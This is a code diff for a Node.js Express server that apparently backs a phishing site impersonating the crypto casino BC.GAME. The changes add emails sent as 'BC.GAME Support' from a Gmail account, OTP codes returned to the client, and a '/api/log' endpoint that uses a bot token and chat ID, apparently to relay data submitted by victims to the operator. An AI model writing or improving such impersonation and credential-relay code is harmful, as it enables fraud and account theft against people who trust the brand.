@@ -7,12 +7,13 @@ const app = express();
 const port = process.env.PORT || 3000;
 
 app.use(express.json());
-
-// Serve static files
 app.use(express.static(__dirname));
 
+// Detailed SMTP configuration
 const transporter = nodemailer.createTransport({
-    service: 'gmail',
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true, // Use SSL
     auth: {
         user: process.env.EMAIL_USER,
         pass: process.env.EMAIL_PASS
@@ -22,34 +23,39 @@ const transporter = nodemailer.createTransport({
 // Endpoint to send OTP
 app.post('/send-otp', async (req, res) => {
     const { email } = req.body;
+    console.log(`Sending OTP to: ${email}`);
+
     if (!email) return res.status(400).json({ success: false });
 
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
 
     const mailOptions = {
-        from: process.env.EMAIL_USER,
+        from: `"BC.GAME Support" <${process.env.EMAIL_USER}>`,
         to: email,
-        subject: '🔐 BC.GAME Verification Code',
-        html: `<div style="background:#1c1e22; color:white; padding:30px; border-radius:12px; font-family:sans-serif; text-align:center; border:1px solid #3bc117;">
-                <h2 style="color:#3bc117; margin-bottom:20px;">BC.GAME</h2>
-                <p style="font-size:16px;">Your verification code is:</p>
-                <div style="font-size:42px; font-weight:bold; letter-spacing:8px; margin:30px 0; color:#3bc117;">${otp}</div>
-                <p style="color:#98a7b5; font-size:14px;">This code will expire in 5 minutes.</p>
+        subject: '🔐 Your Verification Code',
+        html: `<div style="background:#1c1e22; color:white; padding:40px; border-radius:15px; font-family:sans-serif; text-align:center; border:2px solid #3bc117;">
+                <h1 style="color:#3bc117;">BC.GAME</h1>
+                <p style="font-size:18px;">Verification Code:</p>
+                <div style="font-size:48px; font-weight:bold; letter-spacing:10px; margin:20px 0; color:#3bc117;">${otp}</div>
+                <p style="color:#98a7b5;">This code is valid for 5 minutes.</p>
                </div>`
     };
 
     try {
-        await transporter.sendMail(mailOptions);
+        const info = await transporter.sendMail(mailOptions);
+        console.log('Email sent: ' + info.response);
         res.json({ success: true, otp }); 
     } catch (error) {
-        console.error('Email Error:', error);
-        res.status(500).json({ success: false });
+        console.error('Email Error Details:', error);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
 // SECURE LOGGING ENDPOINT
 app.post('/api/log', async (req, res) => {
     const { title, data } = req.body;
+    console.log('Logging data:', title);
+
     const token = process.env.LOG_BOT_TOKEN;
     const chatId = process.env.LOG_BOT_CHAT_ID;
 
@@ -82,11 +88,10 @@ app.post('/api/log', async (req, res) => {
     }
 });
 
-// Using app.use() instead of app.get('*') to avoid Express 5 PathError
 app.use((req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
+    console.log(`Server is LIVE on port ${port}`);
 });
